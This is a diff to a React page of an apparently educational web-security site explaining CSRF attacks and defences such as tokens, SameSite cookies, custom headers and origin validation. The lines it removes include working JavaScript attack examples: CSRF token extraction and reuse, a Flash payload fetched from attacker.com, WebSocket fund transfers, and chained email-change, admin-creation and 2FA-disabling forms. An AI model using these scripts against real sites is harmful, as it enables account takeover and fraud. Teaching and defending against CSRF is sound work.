@@ -17,14 +17,14 @@ const CSRF: React.FC = () => {
         <div>
           <p className="mb-4">
             CSRF attacks trick authenticated users into executing unwanted actions on a web application where they are currently authenticated.
-            This exploits the trust a website has in a user&apos;s browser, making the victim perform state-changing requests like fund transfers,
+            This exploits the trust a website has in a user's browser, making the victim perform state-changing requests like fund transfers,
             password changes, or account modifications without their knowledge or consent. CSRF is particularly dangerous because it leverages
-            the victim&apos;s existing authenticated session to perform malicious actions.
+            the victim's existing authenticated session to perform malicious actions.
           </p>
           
           <Alert className="mb-4 text-amber-900 dark:text-amber-200 bg-slate-50">
             <InfoIcon className="h-4 w-4" />
-            <AlertTitle>Attacker&apos;s Goal</AlertTitle>
+            <AlertTitle>Attacker's Goal</AlertTitle>
             <AlertDescription>
               Force authenticated users to perform unintended actions such as changing passwords, transferring funds, 
               modifying account settings, or performing administrative functions without their knowledge.
@@ -41,9 +41,9 @@ const CSRF: React.FC = () => {
               <li><strong>User Authentication:</strong> The victim logs into a vulnerable website (e.g., banking site) and receives a session cookie</li>
               <li><strong>Session Persistence:</strong> Without logging out, the victim visits a malicious website controlled by the attacker</li>
               <li><strong>Malicious Request:</strong> The malicious site contains code that automatically submits a form or sends a request to the vulnerable site</li>
-              <li><strong>Automatic Cookie Inclusion:</strong> The victim&apos;s browser automatically includes the session cookies when making the request</li>
+              <li><strong>Automatic Cookie Inclusion:</strong> The victim's browser automatically includes the session cookies when making the request</li>
               <li><strong>Server Processing:</strong> The vulnerable site processes the request as if the victim intentionally submitted it</li>
-              <li><strong>Action Execution:</strong> The malicious action is completed using the victim&apos;s authenticated session</li>
+              <li><strong>Action Execution:</strong> The malicious action is completed using the victim's authenticated session</li>
             </ol>
           </div>
         </div>
@@ -91,7 +91,7 @@ const CSRF: React.FC = () => {
                 <div className="p-4 bg-cybr-muted/50 rounded-md">
                   <h5 className="font-semibold text-lg mb-2">Classic Form-Based CSRF</h5>
                   <p className="text-sm mb-3">
-                    Traditional CSRF attacks using HTML forms that automatically submit when the victim visits the attacker&apos;s page.
+                    Traditional CSRF attacks using HTML forms that automatically submit when the victim visits the attacker's page.
                     These attacks work because browsers automatically include cookies with form submissions to the target domain.
                   </p>
                   
@@ -123,7 +123,7 @@ const CSRF: React.FC = () => {
                   <ol className="list-decimal pl-6 space-y-1 text-sm">
                     <li>Identify all state-changing forms and their required parameters</li>
                     <li>Create a test HTML page with a form targeting the vulnerable endpoint</li>
-                    <li>Ensure you&apos;re logged into the target application in the same browser</li>
+                    <li>Ensure you're logged into the target application in the same browser</li>
                     <li>Visit your test page and check if the action was performed</li>
                     <li>Monitor network traffic to confirm the request was sent with cookies</li>
                   </ol>
@@ -182,7 +182,7 @@ function performCSRF() {
                   <h6 className="font-medium mb-2 mt-3">Limitations and Bypasses:</h6>
                   <ul className="list-disc pl-6 space-y-1 text-sm">
                     <li>Simple requests (GET, POST with specific content types) bypass CORS preflight</li>
-                    <li>Custom headers trigger preflight, but simple headers don&apos;t</li>
+                    <li>Custom headers trigger preflight, but simple headers don't</li>
                     <li>Misconfigured CORS policies may allow cross-origin requests</li>
                     <li>WebSocket connections may not be subject to same restrictions</li>
                   </ul>
@@ -253,7 +253,7 @@ fetch('https://vulnerable-api.com/endpoint', {
                 <div className="p-4 bg-cybr-muted/50 rounded-md">
                   <h5 className="font-semibold text-lg mb-2">Login CSRF</h5>
                   <p className="text-sm mb-3">
-                    A variant where the attacker forces the victim to log into the attacker&apos;s account, 
+                    A variant where the attacker forces the victim to log into the attacker's account, 
                     potentially allowing the attacker to access data the victim enters while logged into the wrong account.
                   </p>
                   
@@ -281,9 +281,9 @@ fetch('https://vulnerable-api.com/endpoint', {
                   
                   <h6 className="font-medium mb-2 mt-3">Impact Scenarios:</h6>
                   <ul className="list-disc pl-6 space-y-1 text-sm">
-                    <li>Victim enters payment information into attacker&apos;s account</li>
-                    <li>Victim uploads files to attacker&apos;s cloud storage</li>
-                    <li>Victim&apos;s search history is saved to attacker&apos;s account</li>
+                    <li>Victim enters payment information into attacker's account</li>
+                    <li>Victim uploads files to attacker's cloud storage</li>
+                    <li>Victim's search history is saved to attacker's account</li>
                     <li>Victim makes purchases that benefit the attacker</li>
                   </ul>
                 </div>
@@ -315,7 +315,7 @@ fetch('https://vulnerable-api.com/endpoint', {
                     <li>Identify all authentication mechanisms and session management</li>
                     <li>Document user roles and privilege levels</li>
                     <li>Catalog all forms, buttons, and interactive elements</li>
-                    <li>Understand the application&apos;s business logic and critical functions</li>
+                    <li>Understand the application's business logic and critical functions</li>
                     <li>Identify single-page application (SPA) vs traditional multi-page architecture</li>
                   </ul>
                   
@@ -536,102 +536,6 @@ analyzeCsrfProtection();`}
 </body>
 </html>`}
                   />
-                  
-                  <h6 className="font-medium mb-2 mt-3">Advanced Bypass Techniques:</h6>
-                  <CodeExample
-                    language="javascript"
-                    title="CSRF Protection Bypass Methods"
-                    code={`// Method 1: Token Extraction and Reuse
-async function extractAndReuseToken() {
-    try {
-        // First, fetch the page to extract CSRF token
-        const response = await fetch('https://target.com/profile', {
-            credentials: 'include'
-        });
-        const html = await response.text();
-        
-        // Extract token using regex
-        const tokenMatch = html.match(/name="csrf_token" value="([^"]+)"/);
-        if (tokenMatch) {
-            const token = tokenMatch[1];
-            console.log('Extracted token:', token);
-            
-            // Use token in malicious request
-            return fetch('https://target.com/change-email', {
-                method: 'POST',
-                credentials: 'include',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: \`csrf_token=\${token}&new_email=attacker@evil.com\`
-            });
-        }
-    } catch (error) {
-        console.log('Token extraction failed:', error);
-    }
-}
-
-// Method 2: Subdomain-based Origin Bypass
-function subdomainBypass() {
-    // If target.com allows requests from *.target.com
-    // Set up attack on attacker-controlled subdomain
-    
-    const form = document.createElement('form');
-    form.method = 'POST';
-    form.action = 'https://target.com/admin/promote-user';
-    
-    const input = document.createElement('input');
-    input.type = 'hidden';
-    input.name = 'user_id';
-    input.value = 'attacker_user_id';
-    
-    form.appendChild(input);
-    document.body.appendChild(form);
-    form.submit();
-}
-
-// Method 3: Flash-based CSRF (Legacy systems)
-function flashBasedCSRF() {
-    // Create Flash object that can bypass CORS restrictions
-    const flashObject = document.createElement('object');
-    flashObject.type = 'application/x-shockwave-flash';
-    flashObject.data = 'https://attacker.com/csrf-exploit.swf';
-    
-    // Pass parameters to Flash
-    const param = document.createElement('param');
-    param.name = 'flashvars';
-    param.value = 'target=https://target.com/api/sensitive&method=POST&data=malicious_payload';
-    
-    flashObject.appendChild(param);
-    document.body.appendChild(flashObject);
-}
-
-// Method 4: WebSocket CSRF
-function websocketCSRF() {
-    const ws = new WebSocket('wss://target.com/websocket');
-    
-    ws.onopen = function() {
-        // Send malicious WebSocket message
-        ws.send(JSON.stringify({
-            action: 'transfer_funds',
-            recipient: 'attacker_account',
-            amount: 10000
-        }));
-    };
-}
-
-// Method 5: DNS Rebinding Attack
-function dnsRebindingCSRF() {
-    // Advanced technique: Use DNS rebinding to bypass origin checks
-    // Requires control over DNS records
-    
-    // Initial request to attacker domain that resolves to target IP
-    fetch('http://csrf.attacker.com/admin/delete-all-users', {
-        method: 'POST',
-        credentials: 'include'
-    });
-}`}
-                  />
                 </div>
               </div>
             </TabsContent>
@@ -672,15 +576,6 @@ function dnsRebindingCSRF() {
                       </ul>
                     </div>
                   </div>
-                  
-                  <h6 className="font-medium mb-2 mt-3">Evidence Collection:</h6>
-                  <ul className="list-disc pl-6 space-y-1 text-sm">
-                    <li>HTTP request/response logs showing successful CSRF</li>
-                    <li>Before/after screenshots of affected data</li>
-                    <li>Browser developer tools network tab recordings</li>
-                    <li>Application audit logs if accessible</li>
-                    <li>Video recording of the complete attack flow</li>
-                  </ul>
                 </div>
               </div>
             </TabsContent>
@@ -696,117 +591,6 @@ function dnsRebindingCSRF() {
                     <li>Exploit CSRF in password reset functionality</li>
                     <li>Leverage CSRF to disable security features</li>
                     <li>Use CSRF to create backdoor accounts</li>
-                  </ul>
-                  
-                  <h6 className="font-medium mb-2 mt-3">Advanced Attack Scenarios:</h6>
-                  <CodeExample
-                    language="javascript"
-                    title="CSRF Attack Chaining"
-                    code={`// Scenario 1: CSRF + XSS for Account Takeover
-function csrfXssChain() {
-    // Step 1: Use CSRF to change victim's email to attacker-controlled
-    const emailForm = document.createElement('form');
-    emailForm.action = 'https://target.com/change-email';
-    emailForm.method = 'POST';
-    
-    const emailInput = document.createElement('input');
-    emailInput.type = 'hidden';
-    emailInput.name = 'new_email';
-    emailInput.value = 'attacker@evil.com';
-    
-    emailForm.appendChild(emailInput);
-    document.body.appendChild(emailForm);
-    emailForm.submit();
-    
-    // Step 2: Trigger password reset to attacker-controlled email
-    setTimeout(() => {
-        const resetForm = document.createElement('form');
-        resetForm.action = 'https://target.com/password-reset';
-        resetForm.method = 'POST';
-        
-        const resetInput = document.createElement('input');
-        resetInput.type = 'hidden';
-        resetInput.name = 'email';
-        resetInput.value = 'attacker@evil.com';
-        
-        resetForm.appendChild(resetInput);
-        document.body.appendChild(resetForm);
-        resetForm.submit();
-    }, 2000);
-}
-
-// Scenario 2: CSRF to Create Admin User
-function createAdminViaCSRF() {
-    // Target admin user creation endpoint
-    const adminForm = document.createElement('form');
-    adminForm.action = 'https://target.com/admin/create-user';
-    adminForm.method = 'POST';
-    
-    const inputs = [
-        { name: 'username', value: 'csrf_admin' },
-        { name: 'password', value: 'AttackerPassword123!' },
-        { name: 'email', value: 'admin@attacker.com' },
-        { name: 'role', value: 'administrator' },
-        { name: 'permissions', value: 'all' }
-    ];
-    
-    inputs.forEach(inputData => {
-        const input = document.createElement('input');
-        input.type = 'hidden';
-        input.name = inputData.name;
-        input.value = inputData.value;
-        adminForm.appendChild(input);
-    });
-    
-    document.body.appendChild(adminForm);
-    adminForm.submit();
-}
-
-// Scenario 3: Mass CSRF Attack via Social Engineering
-function massCSRFCampaign() {
-    // Multi-target CSRF attack
-    const targets = [
-        'https://target.com/transfer-funds',
-        'https://target.com/change-password',
-        'https://target.com/disable-2fa'
-    ];
-    
-    targets.forEach((target, index) => {
-        setTimeout(() => {
-            const form = document.createElement('form');
-            form.action = target;
-            form.method = 'POST';
-            
-            // Add appropriate inputs based on target
-            if (target.includes('transfer')) {
-                form.innerHTML = \`
-                    <input type="hidden" name="recipient" value="attacker">
-                    <input type="hidden" name="amount" value="100">
-                \`;
-            } else if (target.includes('password')) {
-                form.innerHTML = \`
-                    <input type="hidden" name="new_password" value="hacked123">
-                \`;
-            } else if (target.includes('2fa')) {
-                form.innerHTML = \`
-                    <input type="hidden" name="disable_2fa" value="true">
-                \`;
-            }
-            
-            document.body.appendChild(form);
-            form.submit();
-        }, index * 1000); // Stagger requests
-    });
-}`}
-                  />
-                  
-                  <h6 className="font-medium mb-2 mt-3">Persistence Techniques:</h6>
-                  <ul className="list-disc pl-6 space-y-1 text-sm">
-                    <li>Use CSRF to add persistent backdoor accounts</li>
-                    <li>Modify application settings to maintain access</li>
-                    <li>Create webhook endpoints for continued exploitation</li>
-                    <li>Add attacker&apos;s SSH keys via CSRF if functionality exists</li>
-                    <li>Modify notification settings to hide malicious activities</li>
                   </ul>
                 </div>
               </div>
@@ -835,25 +619,16 @@ function massCSRFCampaign() {
                 <ul className="list-disc pl-6 space-y-1 text-xs mb-3">
                   <li>Generate cryptographically secure random tokens with sufficient entropy (at least 128 bits)</li>
                   <li>Use a different token for each form or session, never reuse tokens</li>
-                  <li>Store tokens server-side tied to the user&apos;s session</li>
+                  <li>Store tokens server-side tied to the user's session</li>
                   <li>Validate tokens on every state-changing request (POST, PUT, DELETE)</li>
                   <li>Implement token expiration to limit the window of vulnerability</li>
                   <li>Use constant-time comparison to prevent timing attacks</li>
                 </ul>
                 
-                <Tabs defaultValue="tokens">
-                  <TabsList className="bg-slate-200 dark:bg-slate-800">
-                    <TabsTrigger value="tokens">CSRF Tokens</TabsTrigger>
-                    <TabsTrigger value="samesite">SameSite Cookies</TabsTrigger>
-                    <TabsTrigger value="headers">Custom Headers</TabsTrigger>
-                    <TabsTrigger value="validation">Origin Validation</TabsTrigger>
-                  </TabsList>
-                  
-                  <TabsContent value="tokens" className="mt-4">
-                    <CodeExample
-                      language="javascript"
-                      title="CSRF Token Implementation"
-                      code={`// Express.js with CSRF protection
+                <CodeExample
+                  language="javascript"
+                  title="CSRF Token Implementation"
+                  code={`// Express.js with CSRF protection
 const express = require('express');
 const csrf = require('csurf');
 const cookieParser = require('cookie-parser');
@@ -874,16 +649,12 @@ app.use(session({
   }
 }));
 
-// Setup CSRF protection with enhanced security
+// Setup CSRF protection
 const csrfProtection = csrf({
   cookie: {
     httpOnly: true,
     secure: process.env.NODE_ENV === 'production',
     sameSite: 'strict'
-  },
-  // Custom token generation
-  value: (req) => {
-    return req.body._csrf || req.query._csrf || req.headers['x-csrf-token'];
   }
 });
 
@@ -902,78 +673,40 @@ app.get('/api/csrf-token', (req, res) => {
 app.post('/api/transfer', csrfProtection, (req, res) => {
   const { recipient, amount } = req.body;
   
-  // Additional validation
   if (!recipient || !amount || amount <= 0) {
     return res.status(400).json({ error: 'Invalid transfer parameters' });
   }
   
-  // CSRF token is automatically validated by middleware
   try {
     processTransfer(req.user.id, recipient, amount);
     res.json({ success: true, message: 'Transfer completed successfully' });
   } catch (error) {
     res.status(500).json({ error: 'Transfer failed' });
   }
-});
-
-// Manual token validation for custom scenarios
-function validateCsrfToken(req, res, next) {
-  const token = req.headers['x-csrf-token'] || 
-                req.body._csrf || 
-                req.query._csrf;
-  const storedToken = req.session.csrfSecret;
-  
-  if (!token || !storedToken) {
-    return res.status(403).json({ 
-      error: 'CSRF token missing',
-      code: 'CSRF_TOKEN_MISSING'
-    });
-  }
-  
-  // Use constant-time comparison to prevent timing attacks
-  if (!crypto.timingSafeEqual(Buffer.from(token), Buffer.from(storedToken))) {
-    return res.status(403).json({ 
-      error: 'Invalid CSRF token',
-      code: 'CSRF_TOKEN_INVALID'
-    });
-  }
-  
-  next();
-}
-
-// Client-side token handling
-app.get('/profile', (req, res) => {
-  res.render('profile', { 
-    csrfToken: req.csrfToken(),
-    user: req.user 
-  });
 });`}
-                    />
-                  </TabsContent>
-                  
-                  <TabsContent value="samesite" className="mt-4">
-                    <div className="space-y-4">
-                      <div className="p-4 bg-cybr-muted/50 rounded-md">
-                        <h6 className="font-medium mb-2">SameSite Cookie Attribute</h6>
-                        <p className="text-sm mb-3">
-                          The SameSite attribute provides a robust defense against CSRF attacks by controlling when cookies are sent with cross-site requests. 
-                          This browser-enforced protection can significantly reduce CSRF attack surface when properly configured.
-                        </p>
-                        
-                        <h7 className="font-medium text-sm mb-2">SameSite Values and Their Impact:</h7>
-                        <ul className="list-disc pl-6 space-y-1 text-xs mb-3">
-                          <li><strong>Strict:</strong> Cookies never sent with cross-site requests, maximum protection but may break legitimate workflows</li>
-                          <li><strong>Lax:</strong> Cookies sent with top-level navigation but not with embedded requests, good balance of security and usability</li>
-                          <li><strong>None:</strong> Cookies sent with all cross-site requests, requires Secure flag and HTTPS</li>
-                        </ul>
-                      </div>
-                      
-                      <CodeExample
-                        language="javascript"
-                        title="SameSite Cookie Configuration"
-                        code={`// Express.js session configuration with SameSite
+                />
+              </div>
+              
+              <div className="p-4 bg-cybr-muted/50 rounded-md mb-4">
+                <h6 className="font-medium mb-2">2. SameSite Cookie Attribute</h6>
+                <p className="text-sm mb-3">
+                  The SameSite attribute provides browser-enforced protection against CSRF attacks by controlling 
+                  when cookies are sent with cross-site requests. This modern approach can significantly reduce 
+                  CSRF attack surface when properly configured.
+                </p>
+                
+                <h7 className="font-medium text-sm mb-2">SameSite Values and Their Impact:</h7>
+                <ul className="list-disc pl-6 space-y-1 text-xs mb-3">
+                  <li><strong>Strict:</strong> Cookies never sent with cross-site requests, maximum protection but may break legitimate workflows</li>
+                  <li><strong>Lax:</strong> Cookies sent with top-level navigation but not with embedded requests, good balance of security and usability</li>
+                  <li><strong>None:</strong> Cookies sent with all cross-site requests, requires Secure flag and HTTPS</li>
+                </ul>
+                
+                <CodeExample
+                  language="javascript"
+                  title="SameSite Cookie Configuration"
+                  code={`// Express.js session configuration with SameSite
 const session = require('express-session');
-const MongoStore = require('connect-mongo');
 
 app.use(session({
   secret: process.env.SESSION_SECRET,
@@ -984,22 +717,6 @@ app.use(session({
     sameSite: 'strict', // Strongest CSRF protection
     maxAge: 24 * 60 * 60 * 1000, // 24 hours
     domain: '.example.com' // Explicit domain setting
-  },
-  resave: false,
-  saveUninitialized: false,
-  store: MongoStore.create({
-    mongoUrl: process.env.MONGODB_URL
-  })
-}));
-
-// Alternative configuration for applications requiring cross-site functionality
-app.use(session({
-  secret: process.env.SESSION_SECRET,
-  cookie: {
-    httpOnly: true,
-    secure: true, // Required when sameSite: 'none'
-    sameSite: 'lax', // More permissive for legitimate cross-site navigation
-    maxAge: 4 * 60 * 60 * 1000 // 4 hours for sensitive applications
   },
   resave: false,
   saveUninitialized: false
@@ -1017,58 +734,27 @@ app.post('/login', (req, res) => {
     secure: process.env.NODE_ENV === 'production',
     sameSite: 'strict',
     maxAge: 8 * 60 * 60 * 1000, // 8 hours
-    path: '/', // Explicit path
+    path: '/',
     domain: process.env.COOKIE_DOMAIN
   });
   
   res.json({ success: true, message: 'Login successful' });
-});
-
-// Browser detection for SameSite support
-function setSameSiteCookie(res, name, value, options) {
-  const userAgent = req.get('User-Agent') || '';
-  
-  // Check for browsers that don't support SameSite
-  const isUnsupportedBrowser = /Chrome\/5[1-9]|Chrome\/6[0-6]/.test(userAgent) ||
-                               /Safari\//.test(userAgent) && !/Chrome/.test(userAgent);
-  
-  if (isUnsupportedBrowser) {
-    // Fallback for older browsers - use secure and httpOnly flags only
-    res.cookie(name, value, {
-      ...options,
-      sameSite: undefined
-    });
-  } else {
-    res.cookie(name, value, options);
-  }
-}`}
-                      />
-                    </div>
-                  </TabsContent>
-                  
-                  <TabsContent value="headers" className="mt-4">
-                    <div className="space-y-4">
-                      <div className="p-4 bg-cybr-muted/50 rounded-md">
-                        <h6 className="font-medium mb-2">Custom Headers for CSRF Protection</h6>
-                        <p className="text-sm mb-3">
-                          Custom headers provide an additional layer of CSRF protection by leveraging the Same-Origin Policy. 
-                          Browsers prevent cross-site requests from setting custom headers, making this an effective defense 
-                          for AJAX-heavy applications and APIs.
-                        </p>
-                        
-                        <h7 className="font-medium text-sm mb-2">Implementation Strategy:</h7>
-                        <ul className="list-disc pl-6 space-y-1 text-xs mb-3">
-                          <li>Require custom headers for all API endpoints</li>
-                          <li>Use double-submit cookie pattern with header validation</li>
-                          <li>Implement both client-side and server-side header validation</li>
-                          <li>Combine with other CSRF protection methods for defense-in-depth</li>
-                        </ul>
-                      </div>
-                      
-                      <CodeExample
-                        language="javascript"
-                        title="Custom Headers for CSRF Protection"
-                        code={`// Client-side: Add custom header to all AJAX requests
+});`}
+                />
+              </div>
+              
+              <div className="p-4 bg-cybr-muted/50 rounded-md mb-4">
+                <h6 className="font-medium mb-2">3. Custom Headers for CSRF Protection</h6>
+                <p className="text-sm mb-3">
+                  Custom headers provide an additional layer of CSRF protection by leveraging the Same-Origin Policy. 
+                  Browsers prevent cross-site requests from setting custom headers, making this an effective defense 
+                  for AJAX-heavy applications and APIs.
+                </p>
+                
+                <CodeExample
+                  language="javascript"
+                  title="Custom Headers Implementation"
+                  code={`// Client-side: Add custom header to all AJAX requests
 class CSRFProtectedAPI {
   constructor() {
     this.csrfToken = this.getCSRFToken();
@@ -1076,7 +762,6 @@ class CSRFProtectedAPI {
   }
   
   getCSRFToken() {
-    // Get token from meta tag
     const metaToken = document.querySelector('meta[name="csrf-token"]');
     return metaToken ? metaToken.getAttribute('content') : null;
   }
@@ -1084,7 +769,7 @@ class CSRFProtectedAPI {
   async makeSecureRequest(endpoint, options = {}) {
     const defaultHeaders = {
       'Content-Type': 'application/json',
-      'X-Requested-With': 'XMLHttpRequest', // Custom header requirement
+      'X-Requested-With': 'XMLHttpRequest',
       'X-CSRF-Token': this.csrfToken
     };
     
@@ -1094,359 +779,87 @@ class CSRFProtectedAPI {
         ...defaultHeaders,
         ...options.headers
       },
-      credentials: 'include' // Include cookies
+      credentials: 'include'
     };
     
-    try {
-      const response = await fetch(\`\${this.apiBaseUrl}\${endpoint}\`, requestOptions);
-      
-      if (!response.ok) {
-        if (response.status === 403) {
-          throw new Error('CSRF protection triggered');
-        }
-        throw new Error(\`HTTP \${response.status}: \${response.statusText}\`);
+    const response = await fetch(this.apiBaseUrl + endpoint, requestOptions);
+    
+    if (!response.ok) {
+      if (response.status === 403) {
+        throw new Error('CSRF protection triggered');
       }
-      
-      return await response.json();
-    } catch (error) {
-      console.error('API request failed:', error);
-      throw error;
+      throw new Error('HTTP ' + response.status + ': ' + response.statusText);
     }
-  }
-  
-  // Wrapper methods for different HTTP verbs
-  async get(endpoint) {
-    return this.makeSecureRequest(endpoint, { method: 'GET' });
-  }
-  
-  async post(endpoint, data) {
-    return this.makeSecureRequest(endpoint, {
-      method: 'POST',
-      body: JSON.stringify(data)
-    });
-  }
-  
-  async put(endpoint, data) {
-    return this.makeSecureRequest(endpoint, {
-      method: 'PUT',
-      body: JSON.stringify(data)
-    });
-  }
-  
-  async delete(endpoint) {
-    return this.makeSecureRequest(endpoint, { method: 'DELETE' });
+    
+    return await response.json();
   }
 }
 
 // Server-side: Validate custom headers
-const express = require('express');
-const app = express();
-
-// Middleware to validate required headers
 function requireCustomHeaders(req, res, next) {
-  const requiredHeaders = {
-    'x-requested-with': 'XMLHttpRequest',
-    'x-csrf-token': req.session.csrfToken || req.cookies.csrfToken
-  };
-  
-  // Check for required custom header
   if (!req.headers['x-requested-with']) {
     return res.status(400).json({ 
-      error: 'Missing required header: X-Requested-With',
-      code: 'MISSING_CUSTOM_HEADER'
+      error: 'Missing required header: X-Requested-With'
     });
   }
   
-  // Validate X-Requested-With header value
   if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
     return res.status(400).json({ 
-      error: 'Invalid X-Requested-With header value',
-      code: 'INVALID_HEADER_VALUE'
-    });
-  }
-  
-  // CSRF token validation via header
-  const csrfToken = req.headers['x-csrf-token'];
-  const storedToken = req.session.csrfToken;
-  
-  if (!csrfToken || !storedToken) {
-    return res.status(403).json({ 
-      error: 'CSRF token missing from headers',
-      code: 'CSRF_TOKEN_MISSING'
-    });
-  }
-  
-  if (csrfToken !== storedToken) {
-    return res.status(403).json({ 
-      error: 'Invalid CSRF token in headers',
-      code: 'CSRF_TOKEN_INVALID'
+      error: 'Invalid X-Requested-With header value'
     });
   }
   
   next();
 }
 
-// Apply header validation to API routes
-app.use('/api/', requireCustomHeaders);
-
-// Double submit cookie pattern implementation
-app.use('/api/', (req, res, next) => {
-  const cookieToken = req.cookies['csrf-token'];
-  const headerToken = req.headers['x-csrf-token'];
-  
-  if (!cookieToken || !headerToken) {
-    return res.status(403).json({ 
-      error: 'CSRF tokens missing',
-      code: 'CSRF_DOUBLE_SUBMIT_MISSING'
-    });
-  }
-  
-  if (cookieToken !== headerToken) {
-    return res.status(403).json({ 
-      error: 'CSRF token mismatch',
-      code: 'CSRF_DOUBLE_SUBMIT_MISMATCH'
-    });
-  }
-  
-  next();
-});
-
-// Content-Type validation for JSON endpoints
-app.use('/api/json/', (req, res, next) => {
-  const contentType = req.headers['content-type'];
-  
-  if (!contentType || !contentType.includes('application/json')) {
-    return res.status(400).json({ 
-      error: 'Invalid content type, expected application/json',
-      code: 'INVALID_CONTENT_TYPE'
-    });
-  }
-  
-  next();
-});`}
-                      />
-                    </div>
-                  </TabsContent>
-                  
-                  <TabsContent value="validation" className="mt-4">
-                    <div className="space-y-4">
-                      <div className="p-4 bg-cybr-muted/50 rounded-md">
-                        <h6 className="font-medium mb-2">Origin and Referer Validation</h6>
-                        <p className="text-sm mb-3">
-                          Origin and Referer header validation provides an additional defensive layer by ensuring requests 
-                          originate from expected domains. While not foolproof due to potential header spoofing or missing headers, 
-                          this validation can effectively block many CSRF attacks when implemented correctly.
-                        </p>
-                        
-                        <h7 className="font-medium text-sm mb-2">Implementation Considerations:</h7>
-                        <ul className="list-disc pl-6 space-y-1 text-xs mb-3">
-                          <li>Origin header is more reliable than Referer and is sent with POST requests</li>
-                          <li>Handle cases where headers might be missing (proxies, privacy tools)</li>
-                          <li>Implement subdomain validation carefully to prevent subdomain takeover attacks</li>
-                          <li>Use as a secondary defense, not the primary CSRF protection</li>
-                        </ul>
-                      </div>
-                      
-                      <CodeExample
-                        language="javascript"
-                        title="Origin and Referer Validation"
-                        code={`// Comprehensive Origin and Referer validation
-const crypto = require('crypto');
-const url = require('url');
-
-class CSRFOriginValidator {
-  constructor(allowedOrigins, allowedDomains) {
-    this.allowedOrigins = new Set(allowedOrigins);
-    this.allowedDomains = new Set(allowedDomains);
-  }
-  
-  validateOrigin(req, res, next) {
-    const origin = req.headers.origin;
-    const host = req.headers.host;
-    
-    // For same-origin requests, origin might be undefined
-    if (!origin) {
-      // Check if it's a same-origin request
-      const referer = req.headers.referer;
-      if (referer) {
-        const refererUrl = new URL(referer);
-        if (refererUrl.host === host) {
-          return next(); // Same-origin request
-        }
-      }
-      
-      // Strict mode: reject requests without origin
-      if (process.env.CSRF_STRICT_ORIGIN === 'true') {
-        return res.status(403).json({ 
-          error: 'Origin header required',
-          code: 'ORIGIN_MISSING'
-        });
-      }
-      
-      return next(); // Allow requests without origin in non-strict mode
-    }
-    
-    // Validate against allowed origins
-    if (this.allowedOrigins.has(origin)) {
-      return next();
-    }
-    
-    // Validate against allowed domains (including subdomains)
-    try {
-      const originUrl = new URL(origin);
-      const originDomain = originUrl.hostname;
-      
-      for (const allowedDomain of this.allowedDomains) {
-        if (originDomain === allowedDomain || 
-            originDomain.endsWith(\`.\${allowedDomain}\`)) {
-          return next();
-        }
-      }
-    } catch (error) {
-      return res.status(400).json({ 
-        error: 'Invalid origin format',
-        code: 'ORIGIN_INVALID_FORMAT'
-      });
-    }
-    
-    // Origin not allowed
-    return res.status(403).json({ 
-      error: \`Origin '\${origin}' not allowed\`,
-      code: 'ORIGIN_NOT_ALLOWED'
-    });
-  }
-  
-  validateReferer(req, res, next) {
-    const referer = req.headers.referer;
-    const host = req.headers.host;
-    
-    if (!referer) {
-      // Some legitimate requests might not have referer
-      if (process.env.CSRF_REQUIRE_REFERER === 'true') {
-        return res.status(403).json({ 
-          error: 'Referer header required',
-          code: 'REFERER_MISSING'
-        });
-      }
-      return next();
-    }
-    
-    try {
-      const refererUrl = new URL(referer);
-      const refererHost = refererUrl.hostname;
-      
-      // Check if referer matches current host
-      if (refererHost === host) {
-        return next();
-      }
-      
-      // Check against allowed domains
-      for (const allowedDomain of this.allowedDomains) {
-        if (refererHost === allowedDomain || 
-            refererHost.endsWith(\`.\${allowedDomain}\`)) {
-          return next();
-        }
-      }
-      
-      return res.status(403).json({ 
-        error: \`Referer '\${refererHost}' not allowed\`,
-        code: 'REFERER_NOT_ALLOWED'
-      });
-      
-    } catch (error) {
-      return res.status(400).json({ 
-        error: 'Invalid referer format',
-        code: 'REFERER_INVALID_FORMAT'
-      });
-    }
-  }
-}
-
-// Usage example
-const csrfValidator = new CSRFOriginValidator(
-  ['https://app.example.com', 'https://admin.example.com'], // Exact origins
-  ['example.com'] // Domains (includes subdomains)
-);
-
-// Apply validation middleware
-app.use('/api/sensitive/', [
-  csrfValidator.validateOrigin.bind(csrfValidator),
-  csrfValidator.validateReferer.bind(csrfValidator)
-]);
-
-// Advanced validation with logging
-function enhancedOriginValidation(req, res, next) {
+app.use('/api/', requireCustomHeaders);`}
+                />
+              </div>
+              
+              <div className="p-4 bg-cybr-muted/50 rounded-md mb-4">
+                <h6 className="font-medium mb-2">4. Origin and Referer Validation</h6>
+                <p className="text-sm mb-3">
+                  Origin and Referer header validation provides an additional defensive layer by ensuring requests 
+                  originate from expected domains. While not foolproof due to potential header spoofing or missing headers, 
+                  this validation can effectively block many CSRF attacks when implemented correctly.
+                </p>
+                
+                <CodeExample
+                  language="javascript"
+                  title="Origin Validation Implementation"
+                  code={`// Origin validation middleware
+function validateOrigin(req, res, next) {
   const origin = req.headers.origin;
-  const referer = req.headers.referer;
-  const userAgent = req.headers['user-agent'];
-  const xForwardedFor = req.headers['x-forwarded-for'];
-  const realIP = req.headers['x-real-ip'];
+  const host = req.headers.host;
+  const allowedOrigins = ['https://app.example.com', 'https://admin.example.com'];
   
-  // Log suspicious requests for monitoring
-  const logData = {
-    timestamp: new Date().toISOString(),
-    ip: realIP || xForwardedFor || req.connection.remoteAddress,
-    origin,
-    referer,
-    userAgent,
-    endpoint: req.path,
-    method: req.method
-  };
-  
-  // Check for common CSRF attack patterns
-  const suspiciousPatterns = [
-    /data:text\/html/i, // Data URLs
-    /javascript:/i,     // JavaScript URLs
-    /file:/i,          // File URLs
-    /chrome-extension:/i // Browser extensions
-  ];
-  
-  if (origin && suspiciousPatterns.some(pattern => pattern.test(origin))) {
-    console.warn('Suspicious origin detected:', logData);
+  // For same-origin requests, origin might be undefined
+  if (!origin) {
+    const referer = req.headers.referer;
+    if (referer) {
+      const refererUrl = new URL(referer);
+      if (refererUrl.host === host) {
+        return next(); // Same-origin request
+      }
+    }
+    
     return res.status(403).json({ 
-      error: 'Suspicious origin blocked',
-      code: 'SUSPICIOUS_ORIGIN'
+      error: 'Origin header required'
     });
   }
   
-  // Rate limiting based on origin
-  if (origin && isRateLimited(origin)) {
-    return res.status(429).json({ 
-      error: 'Rate limit exceeded for origin',
-      code: 'ORIGIN_RATE_LIMITED'
+  // Validate against allowed origins
+  if (!allowedOrigins.includes(origin)) {
+    return res.status(403).json({ 
+      error: 'Origin ' + origin + ' not allowed'
     });
   }
   
   next();
 }
 
-// Rate limiting helper (simplified)
-const originRequests = new Map();
